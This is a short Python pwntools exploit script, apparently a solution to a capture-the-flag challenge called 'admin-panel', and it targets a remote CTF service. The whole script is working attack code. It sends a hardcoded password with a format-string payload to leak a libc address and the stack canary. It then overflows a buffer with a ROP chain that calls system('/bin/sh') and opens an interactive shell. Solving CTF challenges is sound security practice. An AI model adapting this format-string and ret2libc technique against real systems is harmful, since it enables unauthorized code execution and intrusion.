from pwn import *



elf = context.binary = ELF("./admin-panel",checksec=False)

# p = elf.process()

p = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")

libc = elf.libc



context.arch = elf.arch



# gdb.attach(p,'''

#     init-gef

#     b *admin+359

#     c

# ''')



payload = b"secretpass123\x00"

payload += b"A"*(32-len(payload))

payload += b"%17$p.%15$p"

p.sendlineafter(b"16:",b"admin")

p.sendlineafter(b"24:",payload)



p.recvuntil(b"admin\n")

leak = p.recvline().strip().split(b".")

libc.address = int(leak[0],16) - 0x2409b

log.critical(f"libc.address: {hex(libc.address)}")

canary = int(leak[1],16)



pop_rdi = 0x0000000000023a5f + libc.address

one_gadget = 0x449d3 + libc.address

ret = 0x000000000002235f + libc.address



log.critical(f"one_gadget: {hex(one_gadget)}")



p.sendline(b"2")

p.sendline(b"a"*72 + p64(canary) + b"A"*8 + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym["system"]))



p.interactive()